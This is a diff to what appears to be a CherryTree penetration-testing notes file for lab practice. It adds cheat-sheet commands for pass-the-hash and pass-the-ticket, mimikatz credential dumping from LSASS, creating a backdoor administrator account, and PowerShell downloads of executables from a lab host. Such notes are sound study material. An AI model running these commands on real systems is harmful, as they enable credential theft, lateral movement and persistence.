@@ -1337,7 +1337,7 @@ Also check
         <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
         <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687808714">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1688334012">
         <rich_text>
 
 
@@ -1547,7 +1547,7 @@ impacket-GetADUsers domain/user:password@IP</codebox>
             <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
           </node>
         </node>
-        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
+        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
           <rich_text>
 
 
@@ -1561,12 +1561,16 @@ or
           <rich_text justification="left"></rich_text>
           <rich_text>
 
+with mimikatz
+</rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
+
 </rich_text>
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
-          <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
-        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1687690347">
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688335528">
           <rich_text>
 </rich_text>
           <rich_text scale="h2">
@@ -1577,6 +1581,52 @@ Setting password for user sophie</rich_text>
 </rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>
+
+
+_______________________________________________________
+
+</rich_text>
+          <rich_text scale="h2">As Admin</rich_text>
+          <rich_text>:
+
+</rich_text>
+          <rich_text scale="h3">Adding a User </rich_text>
+          <rich_text>
+
+
+
+</rich_text>
+          <rich_text scale="h3">Adding use to Admin group</rich_text>
+          <rich_text>
+
+
+
+
+Then accessing the machine
+_________________________________________________________
+</rich_text>
+          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
+          <rich_text>
+
+
+or
+
+</rich_text>
+          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
+$WebClient.DownloadFile("</rich_text>
+          <rich_text family="monospace" foreground="#5ebdab">http://10.11.1.</rich_text>
+          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
+</rich_text>
+          <rich_text>&#13;    
+or
+&#13;</rich_text>
+          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
+          <rich_text family="monospace" foreground="#5ebdab">http://10.11.1.</rich_text>
+          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
+</rich_text>
+          <rich_text>&#13;    
+
+
 
 ______________________________
 
@@ -1616,9 +1666,62 @@ ____________________________________
 
 </rich_text>
           <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+_____________________________________________
+
+
+</rich_text>
+          <rich_text scale="h2">Powershell Remoting</rich_text>
+          <rich_text>
+
+allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
+ You can use Powershell Remoting from Windows by using many </rich_text>
+          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
+          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
+          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
+          <rich_text>.
+ As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
+ you can pass them to the application as a parameters or configure the ccache file as in impacket. 
+ In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
+          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
+          <rich_text> or </rich_text>
+          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
+          <rich_text>.
+ 
+ Ex:
+ 
+ 
+ or
+ 
+ 
+ 
+where ptt is pass the ticket
+ 
+ then
+ 
+ 
+ 
+ 
+ </rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
+ 
+ </rich_text>
+          <rich_text family="monospace">
+</rich_text>
+          <rich_text>
+</rich_text>
           <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
-          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
-          <codebox char_offset="253" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
+          <codebox char_offset="125" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user cel1s0 pass123 /add</codebox>
+          <codebox char_offset="155" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators cel1s0 /add</codebox>
+          <codebox char_offset="277" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+$wc = New-Object Net.WebClient
+$wc.DownloadString("http://10.11.1.  whatever else u want with space")
+</codebox>
+          <codebox char_offset="639" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
+          <codebox char_offset="761" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
 or
 
 # Test if HTTP port is open
@@ -1626,12 +1729,15 @@ Test-NetConnection google.com -CommonTCPPort "Http"
 
 # Or define a port number
 Test-NetConnection google.com -Port 80</codebox>
-          <codebox char_offset="337" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
+          <codebox char_offset="845" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
 
 or  like ippsec writeup
 
 runas /netonly /user:domain.local\user cmd
 </codebox>
+          <codebox char_offset="1630" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
+          <codebox char_offset="1640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
+          <codebox char_offset="1685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
         </node>
         <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1687690808">
           <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
@@ -1821,16 +1927,85 @@ once u have the output make sure u check log file for
 1.  </rich_text>
           <rich_text weight="heavy">Passwords</rich_text>
           <rich_text> via :
-   
+   </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 2.  </rich_text>
           <rich_text weight="heavy">Usernames</rich_text>
           <rich_text> Via:
-   
+   </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 </rich_text>
           <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
           <codebox char_offset="45" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.11.1. | tee ldapSearch.log  </codebox>
           <codebox char_offset="128" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
           <codebox char_offset="152" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log</codebox>
+        </node>
+        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
+          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
+          <rich_text>
+&#13;&#13;• </rich_text>
+          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
+          <rich_text>: </rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
+          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
+&#13;
+&#13;
+&#13;• </rich_text>
+          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
+          <rich_text> (pass the hash):&#13;</rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
+          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
+&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
+&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
+&#13;
+&#13;
+&#13;• ptt (pass the ticket):&#13;</rich_text>
+          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
+          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
+&#13;
+&#13;
+&#13;• tickets:  </rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
+          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
+&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
+&#13;
+&#13;
+&#13;• ekeys:  </rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
+          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
+&#13;
+&#13;
+&#13;• dpapi:  </rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
+          <rich_text>
+&#13;• minidump:&#13;</rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
+          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
+&#13;
+&#13;
+&#13;• kerberos:&#13;</rich_text>
+          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
+          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
+&#13;
+&#13;
+&#13;• </rich_text>
+          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
+          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
+&#13;
+&#13;
+&#13;• </rich_text>
+          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
+          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).
+
+</rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
+&#13;
+&#13;
+&#13;
+</rich_text>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
